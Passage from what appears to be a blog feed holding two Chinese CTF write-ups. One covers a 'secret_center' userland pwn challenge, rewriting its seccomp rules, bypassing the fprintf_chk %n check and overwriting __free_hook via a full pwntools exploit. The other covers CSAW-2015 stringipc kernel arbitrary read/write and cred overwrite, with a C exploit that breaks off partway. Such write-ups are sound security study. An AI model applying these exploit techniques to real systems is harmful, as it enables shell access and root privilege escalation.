在set_guard函数中，通过prctl函数将之前预置的seccomp规则生效。此处存在一个问题，由于程序可以任意设置大小的堆块，而设置seccomp规则的函数与ptctl不在一个函数中，因此可以通过UAF来修改这个seccomp规则。 123456789101112131415161718int set_guard()&#123; int result; // eax __int16 v1; // [rsp+0h] [rbp-18h] __int64 v2; // [rsp+8h] [rbp-10h] v1 = guard_num; v2 = bss_guard; if ( prctl(38, 1LL, 0LL, 0LL, 0LL) ) exit(1); result = prctl(0x16, 2LL, &amp;v1); if ( result ) &#123; perror("what?"); exit(1); &#125; return result;&#125; 漏洞利用程序存在两个显式漏洞堆漏洞和格式化字符串。但是fprintf_chk函数不能使用%n写入数据，由于输出是stderr的情况也不能泄露数据。并且由于程序开启了全部的保护规则，因此仅通过堆漏洞，无法获得地址利用，但是将二者结合使用，会出现很有意思的情况。 12345678└─[$] &lt;&gt; checksec secret_center [*] '/home/p4nda/Desktop/pwn/other/xnuca/secretcenter/secret_center' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled seccompseccomp是在内核中实现的对于用户系统调用及其参数的过滤，决定是否继续调用此系统调用，相当于自废武功，在CTF通防中很容易遇到，一般会禁用execve这样的系统调用，防止拿到shell。 在内核处理请求系统调用时在此处（\arch\x86\entry\enrty_64.S line 247）进入检查， 1234567891011121314151617 /* Do syscall entry tracing */tracesys: movq %rsp, %rdi movl $AUDIT_ARCH_X86_64, %esi call syscall_trace_enter_phase1 test %rax, %rax jnz tracesys_phase2 /* if needed, run the slow path */ RESTORE_C_REGS_EXCEPT_RAX /* else restore clobbered regs */ movq ORIG_RAX(%rsp), %rax jmp entry_SYSCALL_64_fastpath /* and return to the fast path */tracesys_phase2: SAVE_EXTRA_REGS movq %rsp, %rdi movl $AUDIT_ARCH_X86_64, %esi movq %rax, %rdx call syscall_trace_enter_phase2 具体的检查机制在\arch\x86\net\bpf_jit_comp.c中。 好在david942j@217已经写出一套可以方便分析seccomp功能及编写seccomp的工具seccomp-tools 如分析程序预置的seccomp规则. 1234567891011121314151617181920212223242526272829303132333435363738└─[$] &lt;&gt; seccomp-tools dump ./secret_center Welcome to Secret Center![*]Reinforcable Secret Service..[1] show secret on Server[2] input my secret[3] delete my secret[4] Guard Ready[5] Set Guard[6] edit my secret[7] exit&gt;4[1] show secret on Server[2] input my secret[3] delete my secret[4] Guard Ready[5] Set Guard[6] edit my secret[7] exit&gt;5 line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x01 0x00 0xc000003e if (A == ARCH_X86_64) goto 0003 0002: 0x06 0x00 0x00 0x00000000 return KILL 0003: 0x20 0x00 0x00 0x00000000 A = sys_number 0004: 0x15 0x00 0x01 0x000000e7 if (A != exit_group) goto 0006 0005: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0006: 0x15 0x00 0x01 0x00000000 if (A != read) goto 0008 0007: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0008: 0x15 0x00 0x01 0x00000002 if (A != open) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0010: 0x15 0x00 0x01 0x00000001 if (A != write) goto 0012 0011: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0012: 0x15 0x00 0x01 0x00000003 if (A != close) goto 0014 0013: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0014: 0x06 0x00 0x00 0x00000000 return KILL fprintf_chk这个函数在潜意识里觉得这个函数的格式化字符串漏洞是没有办法利用的。如执行%n 1234567891011121314151617181920└─[$] &lt;&gt; ./secret_center Welcome to Secret Center![*]Reinforcable Secret Service..[1] show secret on Server[2] input my secret[3] delete my secret[4] Guard Ready[5] Set Guard[6] edit my secret[7] exit&gt;2Secret Size: 123Content: %nNot Good Secret :P*** %n in writable segment detected ***[1] 42169 abort (core dumped) ./secret_center 可以看到%n被检测出来，可以看一下检测的逻辑在glibc-2.23\stdio-common\vfprintf.c line 892 1234567891011 if (! readonly_format) \ &#123; \ extern int __readonly_area (const void *, size_t) \ attribute_hidden; \ readonly_format \ = __readonly_area (format, ((STR_LEN (format) + 1) \ * sizeof (CHAR_T))); \ &#125; \ if (readonly_format &lt; 0) \ __libc_fatal ("*** %n in writable segment detected ***\n"); \&#125; 可以看到readonlyformat是一个全局变量，当format不通过\_readonly_area检测时，会返回一个负数，从而导致程序结束。 再看一下__readonly_area(\glibc-2.23\sysdeps\unix\sysv\linux\readonly-area.c)，通过fopen打开”/proc/self/maps”，来判断ptr是否是只读段，这样我们好像只要让fprintf_chk认为format是只读段就可以了。 由于我们没有其他权限，不能修改”/proc/self/maps”，可以看能否从fopen中做文章。 fopen提到fopen就不得不提到一个结构体__IO_FILE，这个结构体在IO利用方法里经常遇到，与通常open打开的文件不同的是，其为每个文件定义了缓冲区和虚表函数，而利用_fileno来判定是哪个文件，如stdin._fileno=0。 123456789101112131415161718192021222324252627282930313233343536373839404142struct _IO_FILE &#123; int _flags; /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno;#if 0 int _blksize;#else int _flags2;#endif _IO_off_t _old_offset; /* This used to be _offset but it's too small. */#define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;; 而fopen中真正打开并填写fileno字段的函数在\libio\fileops.c中， 12345678910111213141516171819_IO_FILE *_IO_file_open (_IO_FILE *fp, const char *filename, int posix_mode, int prot, int read_write, int is32not64)&#123; int fdesc;#ifdef _LIBC if (__glibc_unlikely (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL)) fdesc = open_not_cancel (filename, posix_mode | (is32not64 ? 0 : O_LARGEFILE), prot); else fdesc = open (filename, posix_mode | (is32not64 ? 0 : O_LARGEFILE), prot);#else fdesc = open (filename, posix_mode, prot);#endif if (fdesc &lt; 0) return NULL; fp-&gt;_fileno = fdesc; ...&#125; 由于我们可以控制seccomp从而控制系统调用的访问，我们可以将此次打开返回ERROR ，而此时，open的返回值为0，此时fopen并不认为文件打开失败，而是认为其fileno是0，此时程序会从STDIN中读取数据，进行判断。 既然可以控制程序读入的内容，我们可以输入一个伪造的maps数据，使其认为内存是不可写的，这样就可以绕过判断，构造如下数据： 1000000000000-7fffffffffff r-xp 00000000 00:00 0 /bin/p4nda 这样我们可以绕过fprintf_chk判断，利用%n来写数据了。 利用思路沙箱构造我们可以构造这样一个沙箱规则，当遇到系统调用时open时，判断其参数的最后一个字节是否是libc中“/proc/self/maps”的地址，如果是就返回ERROR，否则继续。 后续还有一个坑点，当fopen检查完后，会fclose关闭上述文件，此时用户stdin会被关闭，造成无法后续输入，这样简单，只需把close调用也关闭即可。 最终沙箱规则如下： 12345678910111213A = archA == ARCH_X86_64 ? next : deadA = sys_numberA == close ? dead : nextA == exit_group ? dead : nextA == open ? next : allowA = args[0]A &amp;= 0xffA == 0x7c ? dead : nextallow:return ALLOWdead:return ERRNO(0) 利用seccomp-tools生成这样的规则： 1234567891011121314└─[$] &lt;&gt; seccomp-tools asm rule.asm -a amd64 -f raw | seccomp-tools disasm - line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x08 0xc000003e if (A != ARCH_X86_64) goto 0010 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x15 0x06 0x00 0x00000003 if (A == close) goto 0010 0004: 0x15 0x05 0x00 0x000000e7 if (A == exit_group) goto 0010 0005: 0x15 0x00 0x03 0x00000002 if (A != open) goto 0009 0006: 0x20 0x00 0x00 0x00000010 A = args[0] 0007: 0x54 0x00 0x00 0x000000ff A &amp;= 0xff 0008: 0x15 0x01 0x00 0x0000007c if (A == 124) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0010: 0x06 0x00 0x00 0x00050000 return ERRNO(0) 格式化字符串已经知道了如何绕过%n的检测了，由于没有已知的地址，向哪里写数据又是一个问题，先看一下栈上有哪些数据吧 123456789101112131415161718192021222324Breakpoint __fprintf_chkpwndbg&gt; x /40gx $rsp0x7fffffffd328: 0x0000555555554f4d 0x00000000000000000x7fffffffd338: 0x0000007b00000000 0x00000000ff0a70250x7fffffffd348: 0x0000000000000000 0x00000000000000000x7fffffffd358: 0x0000000000000000 0xff000000ff0000000x7fffffffd368: 0x0000ff0000000000 0x00000000000000000x7fffffffd378: 0x0000000000000000 0x00000000000000000x7fffffffd388: 0x00007ffff7b09ef9 0x00007ffff7dd1b200x7fffffffd398: 0x0000000000000080 0x00000000000000000x7fffffffd3a8: 0x00007ffff7a948c9 0x00000000000000000x7fffffffd3b8: 0x00007ffff7a8e86b 0x00000000000000000x7fffffffd3c8: 0x00000000000000a0 0x0000000000000fff0x7fffffffd3d8: 0xfffffffffffff000 0x00005555557570000x7fffffffd3e8: 0x0000000000001000 0x00000000f7dd73900x7fffffffd3f8: 0x0000000000000000 0x00007fffffffd5300x7fffffffd408: 0x00007ffff7ffea88 0x00007fffffffd5600x7fffffffd418: 0x00007fffffffd5c0 0x00000000ffffffff0x7fffffffd428: 0x00007ffff7dd1b20 0x00000000000000800x7fffffffd438: 0x00007ffff7dd1b78 0x00007ffff7dd1b780x7fffffffd448: 0x0000000000002710 0x00000000000000000x7fffffffd458: 0x000000000000000a 0x00007fffffffd57cpwndbg&gt; x /s 0x00005555557570100x555555757010: "DwHxGpmDtDevggh"... 可以看到，在0x7fffffffd3e0这里，有一个离secret很近的地址，可以通过低字节修改使其指向secret，这样由于判定条件时，不相等的位置是否等于strlen(secret)，这样只要我们向secret写\0，就可以很容易绕过check了，构造格式化字符串如下： 12fmt = ("%256p"*0x19+'%n').ljust(0xa0,'a')input(0x120,fmt+'\x10')#7 此时可以拿到vmmap内容，后续可以再次通过格式化字符串修改__free_hook为system就可以拿到shell，就是这样的格式化字符串构造有点烦… 堆漏洞也可以利用，不过由于有访问次数的限制，我总是差一次访问，就没有细究这种方法是否可行。 EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140from pwn import *import timedebug=0elf = ELF('./secret_center')libc_name = '/lib/x86_64-linux-gnu/libc-2.23.so'libc = ELF(libc_name)context.log_level = 'debug'if debug: p= process('./secret_center')else: #p = remote('106.75.73.20', 8999)#process('./pwn1') p = remote('127.0.0.1', 10006)''' 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x08 0xc000003e if (A != ARCH_X86_64) goto 0010 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x15 0x06 0x00 0x00000003 if (A == close) goto 0010 0004: 0x15 0x05 0x00 0x000000e7 if (A == exit_group) goto 0010 0005: 0x15 0x00 0x03 0x00000002 if (A != open) goto 0009 0006: 0x20 0x00 0x00 0x00000010 A = args[0] 0007: 0x54 0x00 0x00 0x000000ff A &amp;= 0xff 0008: 0x15 0x01 0x00 0x0000007c if (A == 124) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0010: 0x06 0x00 0x00 0x00050001 return ERRNO(1) 0011: 0x06 0x00 0x00 0x00050001 return ERRNO(1)'''def z(a=''): if debug: gdb.attach(p,a)def delete(): p.recvuntil('&gt;\n') p.sendline('3')def guard_ready(): p.recvuntil('&gt;\n') p.sendline('4')def set_guard(): p.recvuntil('&gt;\n') p.sendline('5')def edit(size,content): p.recvuntil('&gt;\n') p.sendline('6') p.recvuntil('size: ') p.sendline(str(size)) p.recvuntil('Content: \n') p.send(content) def input(size,content): p.recvuntil('&gt;\n') p.sendline('2') p.recvuntil('Secret Size: ') p.sendline(str(size)) p.recvuntil('Content: \n') p.send(content) #sleep(0.1)def rule(code,jt ,jf ,k): return p16(code) + p8(jt) + p8(jf) + p32(k) def build_rule(): payload = '' payload+= rule(0x20 ,0x00, 0x00, 0x00000004) # A = arch payload+= rule(0x15 ,0x00, 0x08, 0xc000003e) # if (A != ARCH_X86_64) goto 0010 payload+= rule(0x20 ,0x00, 0x00, 0x00000000) # A = sys_number payload+= rule(0x15 ,0x06, 0x00, 0x00000003) # if (A == close) goto 0010 payload+= rule(0x15 ,0x05, 0x00, 0x000000e7) # if (A == exit_group) goto 0010 payload+= rule(0x15 ,0x00, 0x03, 0x00000002) # if (A != open) goto 0009 payload+= rule(0x20 ,0x00, 0x00, 0x00000010) # A = args[0] payload+= rule(0x54 ,0x00, 0x00, 0x000000ff) # A &amp;= 0xff payload+= rule(0x15 ,0x01, 0x00, 0x0000007c) # if (A == 124) goto 0010 payload+= rule(0x06 ,0x00, 0x00, 0x7fff0000) # return ALLOW payload+= rule(0x06 ,0x00, 0x00, 0x00050000) # return ERRNO(2) return payloadinput(0xF0 ,'p4nda') #1delete()#2guard_ready()#3rule_data = build_rule()#4edit(len(rule_data),rule_data)#5set_guard()#6#z('b fopen\nb __fprintf_chk\nc')fmt = ("%256p"*0x19+'%n').ljust(0xa0,'a')input(0x120,fmt+'\x10')#7p.recvuntil("Not Good Secret :P\n\n")maps = '000000000000-7fffffffffff r-xp 00000000 00:00 0 /bin/p4nda'p.sendline(maps)input(0x68,'\x00')#8libc_address = 0heap_address = 0pie = 0while 1: tmp = p.readline() if "close" in tmp: tmp+= p.readline() tmp.replace("It's close.. Try to get a shell!\n",'') print '[?]',tmp#.split('-')[0] if ('libc-2.23.so' in tmp): addr = int('0x'+tmp.split('-')[0],16) if libc_address == 0: libc_address = addr if 'heap' in tmp: addr = int('0x'+tmp.split('-')[0],16) if heap_address == 0: heap_address = addr if 'secret_center' in tmp: addr = int('0x'+tmp.split('-')[0],16) if pie == 0: pie = addr if (libc_address*heap_address*pie != 0): breakprint '[+]libc_address',hex(libc_address)print '[+]heap_address',hex(heap_address)print '[+]pie',hex(pie)now = 0last= 0fmt = ('%256p'*33)target = libc_address+libc.symbols['system']where = libc_address+libc.symbols['__free_hook']for i in range(6): now = (target&gt;&gt;(i*8))&amp;0xff if last&lt;now: fmt+= '%'+str(now-last)+'c' + '%hhn' else: fmt+= '%'+str(0x100+now-last)+'c'+ '%hhn' last = nowfmt+=';sh'fmt = fmt.ljust(0xe0,'\0')for i in range(6): fmt+= p64(0x31)+p64(where+i) input(0x150,fmt+'\0')#9print 'fmt:',hex(len(fmt)),fmtp.recvuntil('It\'s close.. Try to get a shell!')p.sendline(maps)delete()p.interactive() 总之，题目考察了很多东西，还是很有意思的一道题目，感谢AFang师傅的帮助。]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【KERNEL PWN】从内存任意读写到权限提升]]></title>
    <url>%2F2018%2F11%2F07%2Fstringipc%2F</url>
    <content type="text"><![CDATA[本篇主要以CSAW-2015-CTF的stringipc题目为例，分析了三种从内存任意读写到权限提升的利用方法。本人学习KERNEL PWN的时间也较短，如有差错，请指正。 本文的先知社区链接：https://xz.aliyun.com/t/3204 0 环境搭建与题目分析环境搭建题目环境由于比赛时间过去很久了，没有找到，所以选择自行编译。 内核源码我选择了linux-4.4.110版本。busybox采用1.21.1版本。stringipc的题目源码可以在这里找到。源码及busybox编译可以参考这篇文章进行编译，我就不赘述了。 将stringipc的源码，放在内核源码目录下，并编写Makefile文件，执行make就可以编译成为符合内核源码的驱动文件string.ko。相关环境及题目文件可在此处下载 题目分析题目主要维护了一块由kzalloc(sizeof(*channel), GFP_KERNEL)创建的内存块，并可对内存块读、写、扩展或缩小。此题漏洞存在于对漏洞扩展的函数realloc_ipc_channel中： 1234567891011121314151617181920212223242526static int realloc_ipc_channel ( struct ipc_state *state, int id, size_t size, int grow )&#123; struct ipc_channel *channel; size_t new_size; char *new_data; channel = get_channel_by_id(state, id); if ( IS_ERR(channel) ) return PTR_ERR(channel); if ( grow ) new_size = channel-&gt;buf_size + size; else new_size = channel-&gt;buf_size - size; new_data = krealloc(channel-&gt;data, new_size + 1, GFP_KERNEL); if ( new_data == NULL ) return -EINVAL; channel-&gt;data = new_data; channel-&gt;buf_size = new_size; ipc_channel_put(state, channel); return 0;&#125; 当krealloc返回值不为0时，可以通过验证，将返回值作为内存块起始地址。而krealloc(mm\slab_common.c 1225)在实现中有一个不为0的错误代码ZERO_SIZE_PTR 123456789101112131415161718192021222324252627/** * krealloc - reallocate memory. The contents will remain unchanged. * @p: object to reallocate memory for. * @new_size: how many bytes of memory are required. * @flags: the type of memory to allocate. * * The contents of the object pointed to are preserved up to the * lesser of the new and old sizes. If @p is %NULL, krealloc() * behaves exactly like kmalloc(). If @new_size is 0 and @p is not a * %NULL pointer, the object pointed to is freed. */void *krealloc(const void *p, size_t new_size, gfp_t flags)&#123; void *ret; if (unlikely(!new_size)) &#123; kfree(p); return ZERO_SIZE_PTR; &#125; ret = __do_krealloc(p, new_size, flags); if (ret &amp;&amp; p != ret) kfree(p); return ret;&#125;EXPORT_SYMBOL(krealloc); 而ZERO_SIZE_PTR定义在include\linux\slab.h 101 1#define ZERO_SIZE_PTR ((void *)16) 可知，当new_size = 0时，可返回该值，而构造该值时由于并没有对传入的size进行检查，恰好new_size = 0 - 1 ，即为0xffffffffffffffff，而此后的检测所定义的size值均为size_t 即unsize long long。所以通过题目中给出的seek、read、write功能就可以对内核及用户态地址任意读写。 1 修改cred结构提升权限cred结构体提及cred结构，做过权限提升的同学都不会陌生。这个结构体是用来标注某线程权限的结构体。 首先，每一个线程在内核中都对应一个线程栈、一个线程结构块thread_info去调度，结构体里面同时也包含了线程的一系列信息。 该thread_info结构体存放在线程栈的最低地址，对应的结构体定义(\arch\x86\include\asm\thread_info.h 55)是： 123456789struct thread_info &#123; struct task_struct *task; /* main task structure */ __u32 flags; /* low level flags */ __u32 status; /* thread synchronous flags */ __u32 cpu; /* current CPU */ mm_segment_t addr_limit; unsigned int sig_on_uaccess_error:1; unsigned int uaccess_err:1; /* uaccess failed */&#125;; 而在thread_info里，包含最重要信息的是task_struct结构体，定义在(\include\linux\sched.h 1390) 12345678910111213141516171819202122232425262728裁剪过后 struct task_struct &#123; volatile long state; /* -1 unrunnable, 0 runnable, &gt;0 stopped */ void *stack; atomic_t usage; unsigned int flags; /* per process flags, defined below */ unsigned int ptrace;... .../* process credentials */ const struct cred __rcu *ptracer_cred; /* Tracer's credentials at attach */ const struct cred __rcu *real_cred; /* objective and real subjective task * credentials (COW) */ const struct cred __rcu *cred; /* effective (overridable) subjective task * credentials (COW) */ char comm[TASK_COMM_LEN]; /* executable name excluding path - access with [gs]et_task_comm (which lock it with task_lock()) - initialized normally by setup_new_exec *//* file system info */ struct nameidata *nameidata;#ifdef CONFIG_SYSVIPC/* ipc stuff */ struct sysv_sem sysvsem; struct sysv_shm sysvshm;#endif... ... &#125;; 而其中，cred结构体(\include\linux\cred.h 118)表示的就是这个线程的权限。只要将这个结构的uid~fsgid全部覆写为0就可以把这个线程权限提升为root（root uid为0） 123456789101112131415161718192021222324252627282930313233343536373839struct cred &#123; atomic_t usage;#ifdef CONFIG_DEBUG_CREDENTIALS atomic_t subscribers; /* number of processes subscribed */ void *put_addr; unsigned magic;#define CRED_MAGIC 0x43736564#define CRED_MAGIC_DEAD 0x44656144#endif kuid_t uid; /* real UID of the task */ kgid_t gid; /* real GID of the task */ kuid_t suid; /* saved UID of the task */ kgid_t sgid; /* saved GID of the task */ kuid_t euid; /* effective UID of the task */ kgid_t egid; /* effective GID of the task */ kuid_t fsuid; /* UID for VFS ops */ kgid_t fsgid; /* GID for VFS ops */ unsigned securebits; /* SUID-less security management */ kernel_cap_t cap_inheritable; /* caps our children can inherit */ kernel_cap_t cap_permitted; /* caps we're permitted */ kernel_cap_t cap_effective; /* caps we can actually use */ kernel_cap_t cap_bset; /* capability bounding set */ kernel_cap_t cap_ambient; /* Ambient capability set */#ifdef CONFIG_KEYS unsigned char jit_keyring; /* default keyring to attach requested * keys to */ struct key __rcu *session_keyring; /* keyring inherited over fork */ struct key *process_keyring; /* keyring private to this process */ struct key *thread_keyring; /* keyring private to this thread */ struct key *request_key_auth; /* assumed request_key authority */#endif#ifdef CONFIG_SECURITY void *security; /* subjective LSM security */#endif struct user_struct *user; /* real user ID subscription */ struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */ struct group_info *group_info; /* supplementary groups for euid/fsgid */ struct rcu_head rcu; /* RCU deletion hook */&#125;; 这个结构体在线程初始化由prepare_creds函数创建，可以看到创建cred的方法是kmem_cache_alloc 1234567891011121314151617181920212223242526272829303132333435363738394041424344struct cred *prepare_creds(void)&#123; struct task_struct *task = current; const struct cred *old; struct cred *new; validate_process_creds(); new = kmem_cache_alloc(cred_jar, GFP_KERNEL); if (!new) return NULL; kdebug("prepare_creds() alloc %p", new); old = task-&gt;cred; memcpy(new, old, sizeof(struct cred)); atomic_set(&amp;new-&gt;usage, 1); set_cred_subscribers(new, 0); get_group_info(new-&gt;group_info); get_uid(new-&gt;user); get_user_ns(new-&gt;user_ns);#ifdef CONFIG_KEYS key_get(new-&gt;session_keyring); key_get(new-&gt;process_keyring); key_get(new-&gt;thread_keyring); key_get(new-&gt;request_key_auth);#endif#ifdef CONFIG_SECURITY new-&gt;security = NULL;#endif if (security_prepare_creds(new, old, GFP_KERNEL) &lt; 0) goto error; validate_creds(new); return new;error: abort_creds(new); return NULL;&#125;EXPORT_SYMBOL(prepare_creds); 漏洞利用这种漏洞利用方法非常简单粗暴，即利用内存任意读找到cred结构体，再利用内存任意写，将用于表示权限的数据位写为0，就可以完成提权。 那如何找到这个结构体呢？在task_struct里有一个 char comm[TASK_COMM_LEN]; 结构，而这个结构可以通过prctl函数中的PR_SET_NAME功能，设置为一个小于16字节的字符串。文档 12345678910PR_SET_NAME (since Linux 2.6.9) Set the name of the calling thread, using the value in the location pointed to by (char *) arg2. The name can be up to 16 bytes long, including the terminating null byte. (If the length of the string, including the terminating null byte, exceeds 16 bytes, the string is silently truncated.) This is the same attribute that can be set via pthread_setname_np(3) and retrieved using pthread_getname_np(3). The attribute is likewise accessible via /proc/self/task/[tid]/comm, where tid is the name of the calling thread. 而通过设定这个值，并利用内存任意读即可找到这个预设的字符串，即可找到task_structure结构体，进一步找到cred结构体，就可以利用内存任意写来提权了。 还有一个问题是，爆破的范围如何确定？这涉及到了如何得到一个task_struct，同样是kmem_cache_alloc_node，因此task_struct应该存在内核的动态分配区域。(\kernel\fork.c 140) 1234static inline struct task_struct *alloc_task_struct_node(int node)&#123; return kmem_cache_alloc_node(task_struct_cachep, GFP_KERNEL, node);&#125; 根据内存映射图，爆破范围应该在0xffff880000000000~0xffffc80000000000 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081820xffffffffffffffff ---+-----------+-----------------------------------------------+-------------+ | | |+++++++++++++| 8M | | unused hole |+++++++++++++| | | |+++++++++++++|0xffffffffff7ff000 ---|-----------+------------| FIXADDR_TOP |--------------------|+++++++++++++| 1M | | |+++++++++++++|0xffffffffff600000 ---+-----------+------------| VSYSCALL_ADDR |------------------|+++++++++++++| 548K | | vsyscalls |+++++++++++++|0xffffffffff577000 ---+-----------+------------| FIXADDR_START |------------------|+++++++++++++| 5M | | hole |+++++++++++++|0xffffffffff000000 ---+-----------+------------| MODULES_END |--------------------|+++++++++++++| | | |+++++++++++++| 1520M | | module mapping space (MODULES_LEN) |+++++++++++++| | | |+++++++++++++|0xffffffffa0000000 ---+-----------+------------| MODULES_VADDR |------------------|+++++++++++++| | | |+++++++++++++| 512M | | kernel text mapping, from phys 0 |+++++++++++++| | | |+++++++++++++|0xffffffff80000000 ---+-----------+------------| __START_KERNEL_map |-------------|+++++++++++++| 2G | | hole |+++++++++++++|0xffffffff00000000 ---+-----------+-----------------------------------------------|+++++++++++++| 64G | | EFI region mapping space |+++++++++++++|0xffffffef00000000 ---+-----------+-----------------------------------------------|+++++++++++++| 444G | | hole |+++++++++++++|0xffffff8000000000 ---+-----------+-----------------------------------------------|+++++++++++++| 16T | | %esp fixup stacks |+++++++++++++|0xffffff0000000000 ---+-----------+-----------------------------------------------|+++++++++++++| 3T | | hole |+++++++++++++|0xfffffc0000000000 ---+-----------+-----------------------------------------------|+++++++++++++| 16T | | kasan shadow memory (16TB) |+++++++++++++|0xffffec0000000000 ---+-----------+-----------------------------------------------|+++++++++++++| 1T | | hole |+++++++++++++|0xffffeb0000000000 ---+-----------+-----------------------------------------------| kernel space| 1T | | virtual memory map for all of struct pages |+++++++++++++|0xffffea0000000000 ---+-----------+------------| VMEMMAP_START |------------------|+++++++++++++| 1T | | hole |+++++++++++++|0xffffe90000000000 ---+-----------+------------| VMALLOC_END |------------------|+++++++++++++| 32T | | vmalloc/ioremap (1 &lt;&lt; VMALLOC_SIZE_TB) |+++++++++++++|0xffffc90000000000 ---+-----------+------------| VMALLOC_START |------------------|+++++++++++++| 1T | | hole |+++++++++++++|0xffffc80000000000 ---+-----------+-----------------------------------------------|+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| 64T | | direct mapping of all phys. memory |+++++++++++++| | | (1 &lt;&lt; MAX_PHYSMEM_BITS) |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++|0xffff880000000000 ----+-----------+-----------| __PAGE_OFFSET_BASE | -------------|+++++++++++++| | | |+++++++++++++| 8T | | guard hole, reserved for hypervisor |+++++++++++++| | | |+++++++++++++|0xffff800000000000 ----+-----------+-----------------------------------------------+-------------+ |-----------| |-------------| |-----------| hole caused by [48:63] sign extension |-------------| |-----------| |-------------|0x0000800000000000 ----+-----------+-----------------------------------------------+-------------+ PAGE_SIZE | | guard page |xxxxxxxxxxxxx|0x00007ffffffff000 ----+-----------+--------------| TASK_SIZE_MAX | ---------------|xxxxxxxxxxxxx| | | | user space | | | |xxxxxxxxxxxxx| | | |xxxxxxxxxxxxx| | | |xxxxxxxxxxxxx| 128T | | different per mm |xxxxxxxxxxxxx| | | |xxxxxxxxxxxxx| | | |xxxxxxxxxxxxx| | | |xxxxxxxxxxxxx|0x0000000000000000 ----+-----------+-----------------------------------------------+-------------+ EXP最终EXP及运行结果如下： pwn_task_struct.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156#include &lt;stdio.h&gt;#include &lt;sys/prctl.h&gt; #include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#define CSAW_IOCTL_BASE 0x77617363#define CSAW_ALLOC_CHANNEL CSAW_IOCTL_BASE+1#define CSAW_OPEN_CHANNEL CSAW_IOCTL_BASE+2#define CSAW_GROW_CHANNEL CSAW_IOCTL_BASE+3#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4#define CSAW_READ_CHANNEL CSAW_IOCTL_BASE+5#define CSAW_WRITE_CHANNEL CSAW_IOCTL_BASE+6#define CSAW_SEEK_CHANNEL CSAW_IOCTL_BASE+7#define CSAW_CLOSE_CHANNEL CSAW_IOCTL_BASE+8struct alloc_channel_args &#123; size_t buf_size; int id;&#125;;struct open_channel_args &#123; int id;&#125;;struct shrink_channel_args &#123; int id; size_t size;&#125;;struct read_channel_args &#123; int id; char *buf; size_t count;&#125;;struct write_channel_args &#123; int id; char *buf; size_t count;&#125;;struct seek_channel_args &#123; int id; loff_t index; int whence;&#125;;struct close_channel_args &#123; int id;&#125;;void print_hex(char *buf,size_t len)&#123; int i ; for(i = 0;i&lt;((len/8)*8);i+=8)&#123; printf("0x%lx",*(size_t *)(buf+i) ); if (i%16) printf(" "); else printf("\n"); &#125;&#125;int main()&#123; int fd = -1; int result = 0; struct alloc_channel_args alloc_args; struct shrink_channel_args shrink_args; struct seek_channel_args seek_args; struct read_channel_args read_args; struct close_channel_args close_args; struct write_channel_args write_args; size_t addr = 0xffff880000000000; size_t real_cred = 0; size_t cred = 0; size_t target_addr ; int root_cred[12]; //set target in task_struct setvbuf(stdout, 0LL, 2, 0LL); char *buf = malloc(0x1000); char target[16]; strcpy(target,"try2findmep4nda"); prctl(PR_SET_NAME , target); fd = open("/dev/csaw",O_RDWR); if(fd &lt; 0)&#123; puts("[-] open error"); exit(-1); &#125; alloc_args.buf_size = 0x100; alloc_args.id = -1; ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;alloc_args); if (alloc_args.id == -1)&#123; puts("[-] alloc_channel error"); exit(-1); &#125; printf("[+] now we get a channel %d\n",alloc_args.id); shrink_args.id = 